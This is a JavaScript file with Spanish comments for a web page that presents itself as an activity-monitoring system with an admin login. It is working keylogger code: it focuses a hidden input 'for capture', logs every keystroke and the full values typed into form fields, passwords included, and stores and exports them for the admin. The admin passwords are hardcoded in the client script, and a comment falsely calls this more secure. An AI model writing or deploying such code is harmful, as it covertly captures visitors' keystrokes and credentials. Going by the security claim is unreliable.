
// Credenciales embebidas en el código (más seguro para deploy)
const VALID_CREDENTIALS = [
{ username: 'pipi', password: 'ppppp55555' },
{ username: 'admin', password: 'admin123' }
];

// Variables globales
let activityLogs = [];
let isMonitoring = false;
let isAdminLogged = false;

// Inicializar cuando se carga la página
document.addEventListener('DOMContentLoaded', function() {
console.log('Sistema inicializado');
initializeSystem();
});

function initializeSystem() {
// Cargar logs existentes
loadLogsFromStorage();

// Verificar si hay sesión activa
checkActiveSession();

// Iniciar monitoreo de actividad
startActivityMonitor();
}

// ==================== SISTEMA DE AUTENTICACIÓN ====================

function checkActiveSession() {
const sessionActive = sessionStorage.getItem('adminSession') === 'true';
if (sessionActive) {
showAdminPanel();
} else {
showLoginPanel();
}
}

function login() {
const username = document.getElementById('username').value.trim();
const password = document.getElementById('password').value;
const loginError = document.getElementById('loginError');

// Validar credenciales
const isValid = VALID_CREDENTIALS.some(cred =>
cred.username === username && cred.password === password
);

if (isValid) {
// Crear sesión
sessionStorage.setItem('adminSession', 'true');
sessionStorage.setItem('adminUser', username);

loginError.style.display = 'none';
showAdminPanel();

// Registrar el acceso
logActivity(`Acceso de administrador: ${username}`);

} else {
loginError.style.display = 'block';
logActivity(`Intento de acceso fallido: ${username}`);
}
}

function logout() {
sessionStorage.removeItem('adminSession');
sessionStorage.removeItem('adminUser');
showLoginPanel();

// Limpiar campos de login
document.getElementById('username').value = '';
document.getElementById('password').value = '';

logActivity('Sesión cerrada');
}

function showLoginPanel() {
isAdminLogged = false;
document.getElementById('loginSection').style.display = 'block';
document.getElementById('adminSection').style.display = 'none';
}

function showAdminPanel() {
isAdminLogged = true;
document.getElementById('loginSection').style.display = 'none';
document.getElementById('adminSection').style.display = 'block';

// Cargar y mostrar logs actualizados
loadLogsFromStorage();
updateLogsDisplay();
}

// ==================== SISTEMA DE MONITOREO ====================

function startActivityMonitor() {
if (isMonitoring) return;

isMonitoring = true;
const hiddenInput = document.getElementById('hiddenInput');

// Configurar event listeners
document.addEventListener('keydown', handleKeyPress);
document.addEventListener('click', handleClick);
document.addEventListener('input', handleInput);

// Mantener foco en campo oculto para captura
hiddenInput.focus();

// Registrar inicio del sistema
logActivity('Sistema de monitoreo iniciado');

console.log('Monitor de actividad activado');
}

function handleKeyPress(event) {
if (!isMonitoring) return;

const key = event.key;

// Filtrar teclas no deseadas
if (['Control', 'Alt', 'Shift', 'Meta', 'CapsLock', 'Tab'].includes(key)) {
return;
}

let keyDisplay = key;
if (key === ' ') keyDisplay = '[ESPACIO]';
if (key === 'Enter') keyDisplay = '[ENTER]';
if (key === 'Backspace') keyDisplay = '[BORRAR]';
if (key === 'Escape') keyDisplay = '[ESC]';

logActivity(`Tecla: ${keyDisplay}`);
}

function handleClick(event) {
if (!isMonitoring) return;

const target = event.target;
if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable) {
logActivity(`Clic en campo de entrada: ${target.tagName}`);
}
}

function handleInput(event) {
if (!isMonitoring) return;

const target = event.target;
if (target.id !== 'hiddenInput' &&
(target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
logActivity(`Entrada en ${target.tagName}: "${target.value}"`);
}
}

// ==================== GESTIÓN DE LOGS ====================

function logActivity(message) {
const timestamp = new Date().toLocaleString('es-ES');
const logEntry = {
id: Date.now() + Math.random(),
message: message,
timestamp: timestamp,
userAgent: navigator.userAgent,
url: window.location.href
};

activityLogs.unshift(logEntry);

// Limitar a 500 entradas para evitar sobrecarga
if (activityLogs.length > 500) {
activityLogs = activityLogs.slice(0, 500);
}

// Guardar en almacenamiento local
saveLogsToStorage();

// Actualizar visualización si el admin está logueado
if (isAdminLogged) {
updateLogsDisplay();
}
}

function loadLogsFromStorage() {
try {
const savedLogs = localStorage.getItem('activityLogs');
if (savedLogs) {
activityLogs = JSON.parse(savedLogs);
}
} catch (error) {
console.error('Error cargando logs:', error);
activityLogs = [];
}
}

function saveLogsToStorage() {
try {
localStorage.setItem('activityLogs', JSON.stringify(activityLogs));
} catch (error) {
console.error('Error guardando logs:', error);
}
}

function updateLogsDisplay() {
const logsList = document.getElementById('logsList');

if (!logsList) return;

if (activityLogs.length === 0) {
logsList.innerHTML = '<div class="log-entry">No hay actividad registrada aún.</div>';
return;
}

logsList.innerHTML = activityLogs.map(log => `
<div class="log-entry">
<div class="timestamp">[${log.timestamp}]</div>
<div>${escapeHtml(log.message)}</div>
</div>
`).join('');
}

function clearLogs() {
if (confirm('¿Estás seguro de que quieres eliminar todos los registros?')) {
activityLogs = [];
localStorage.removeItem('activityLogs');
updateLogsDisplay();
logActivity('Registros limpiados por administrador');
}
}

function exportLogs() {
const data = {
exportedAt: new Date().toISOString(),
totalEntries: activityLogs.length,
logs: activityLogs
};

const dataStr = JSON.stringify(data, null, 2);
const dataBlob = new Blob([dataStr], {type: 'application/json'});

const link = document.createElement('a');
link.href = URL.createObjectURL(dataBlob);
link.download = `activity-logs-${new Date().toISOString().split('T')[0]}.json`;
link.click();

logActivity('Registros exportados');
}

// Función auxiliar para seguridad
function escapeHtml(text) {
const div = document.createElement('div');
div.textContent = text;
return div.innerHTML;
}

// Permitir login con Enter
document.getElementById('password').addEventListener('keypress', function(e) {
if (e.key === 'Enter') {
login();
}
});

// Recargar logs cuando la página se vuelve visible
document.addEventListener('visibilitychange', function() {
if (!document.hidden && isAdminLogged) {
loadLogsFromStorage();
updateLogsDisplay();
}
});
